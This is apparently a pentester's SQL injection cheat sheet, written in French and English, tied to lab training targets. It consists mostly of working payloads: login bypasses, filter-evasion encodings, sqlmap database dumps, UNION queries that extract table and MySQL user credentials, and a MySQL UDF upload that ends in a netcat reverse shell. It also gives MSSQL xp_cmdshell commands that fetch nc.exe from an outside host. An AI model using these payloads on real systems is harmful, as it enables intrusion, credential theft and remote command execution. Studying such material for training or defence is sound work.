# SQLi : SQL Injection


## Principe

Requete sql
    SELECT * FROM user WHERE login='[USER]' and password='[PASSWORD]';

Exploitation
    - Close the string : ' "
    - Widen the request : or 1=1
    - Add inputs with UNION
    - Comment end of request : -- #

 
    http://12.0.0.11/sqli/example1.php?name=root' or '1'='1
    http://12.0.0.11/sqli/example1.php?name=root' or '1'=1
    http://12.0.0.11/sqli/example1.php?name=root’ or 1=1-- -
    http://12.0.0.11/sqli/example1.php?name=root%27%20or%20%271%27=%271
 

## Detection

    '
    "
    admin' and sleep(5) and '1'='1


## Bypass login
    http://10.10.10.129/sqli/example1.php?name=root' or 1=1-- -


## Sources & training

    http://f4l13n5n0w.github.io/blog/2015/05/22/pentesterlab-web-for-pentester-sql-injection/


## SqlMap

SQLi sur les paramètres d'un GET

    $ sqlmap -u "http://10.10.10.129/sqli/example1.php?name=root" --dbs --banner

--banner

    [16:24:27] [INFO] fetching banner
    web server operating system: Linux Ubuntu
    web application technology: Nginx 1.10.3
    back-end DBMS operating system: Linux Ubuntu
    back-end DBMS: MySQL >= 5.0
    banner: '5.7.21-0ubuntu0.16.04.1'

--dbs 

    [16:24:28] [INFO] retrieved: 'jetadmin'
    available databases [2]:                                                                                           
    [*] information_schema
    [*] jetadmin

SQLi sur les paramètres d'un POST

    Intercepter la requète avec Burp, et la sauver dans un fichier dologin.txt

    $ sqlmap -r login.txt --dbs --banner
      -p name : forcer le paramètre à tester
    $ sqlmap -r login.txt -D jetadmin --tables
    $ sqlmap -r login.txt -D jetadmin -T users --dump



## Avoid simple filters

Replace Space by Tab %09 

    username=admin%27%09or%091%3D1%09--%09&password=admin


Bypass php function ‘addslashes’ used to insert strings in mysql requests
Use Chinese charset %bf%27  to set a ' in proxy

    username=a%bf%27+or+1=1+#&password=b

Filter sur AND ou OR, les remplacer par

    AND :   &&   %26%26 
    OR  :  || 

Filtrage sur les Espaces -> newlines %A0, utiliser des \t TAB %90 , utiliser /**/

    http://12.0.0.11/sqli/example2.php?name=root%27%A0or%A01=1--%A0-

Filter with : mysql_real_escape_string

    $iId = mysql_real_escape_string("1 OR 1=1");
    http://12.0.0.11/sqli/example4.php?id=2 OR  1=1


### Note: PHP <=5.2.6
SQL Injection won't work on PHP >= v5.2.6.
Unless php tuned for
````
<IfModule mod_php5.c>
    magic_quotes_gpc = Off
    allow_url_fopen = On
    allow_url_include = On
</IfModule>
````


### Limit returned results

    a' or 1=1 LIMIT 1 #


### Identify number of fields in select

On va ajouter dess entrées dans un select, il faut injecter autant d'entrées

Methode 1: Utiliser order by pour identifier le nombre d'entrées du select

    id=engineer order by 10-- throws an error
    id=engineer order by 9-- throws an error
    id=engineer order by 4-- ok => 4 field

Methode 2: injecter 1, puis 2, puis 3 entrées

    UNION SELECT 1,2,3     : ko
    UNION SELECT 1,2,3,4    : ok ==> 4 fields



### Get table names

```
name=a&pass=admin' or 1=1 UNION SELECT 1,2
name=a&pass=admin' or 1=1 UNION SELECT table_name,table_name FROM information_schema.tables; -- -  
```


### Get table column names


```
name=a&pass=admin' or 1=1 UNION SELECT column_name,column_name FROM information_schema.columns WHERE  table_name='users'; -- -

```

### dump table 
```
name=a&pass=admin' or 1=1 UNION SELECT concat(name,':',pass),1 FROM users; -- -
```


### Dump des users de mysql

```
name=a&pass=admin' or 1=1 UNION SELECT concat(User,':',Password),1 FROM user; -- -
Internal Serever Error: Pas le droit..
```

#### Escape cotes

hex-encoded value of “secret” better than messing with quotes. : table_schema='secret' => table_schema=0x736563726574

    printf "secret" | xxd -ps -c 200 | tr -d '\n'
    736563726574
    id=engineer union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=0x736563726574 --


## MySql

### UDF : User Defined function

Compiler une librairie UDF contenant le fonction sys_exec()

L'uploader sur le serveur. La déclarer. La fonction sys_exec() permet de lancer des commandes.

    select sys_exec('/bin/sh');
    after bash access, “bash –p” or “sudo su”


    Tested with : mysql 5.5.60-0+deb8u1
    Create a 'User Defined Function' calling C function 'system'
    Use pre-compiled 32 or 64 depending on target.
    Copy file to /tmp
    create database exploittest;
    use exploittest;
    create table bob(line blob);
    insert into bob values(load_file('/tmp/lib_mysqludf_sys.so'));
    select * from bob into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so
    create function sys_exec returns int soname 'lib_mysqludf_sys.so';
    select sys_exec('nc 11.0.0.21 4444 -e /bin/bash');


##  SQL Server 

Connect to:
````
sqsh -S hostname -Uusername -Ppassword
use database;
go
select * from tblTable;
go
````

If xp_cmdshell is enabled
````
exec master..xp_cmdshell 'type c:\"Documents and Settings"\Administrator\Desktop\proof.txt'
go
EXEC master..xp_cmdshell 'tftp -i 192.168.168.168 GET nc.exe'
go
````

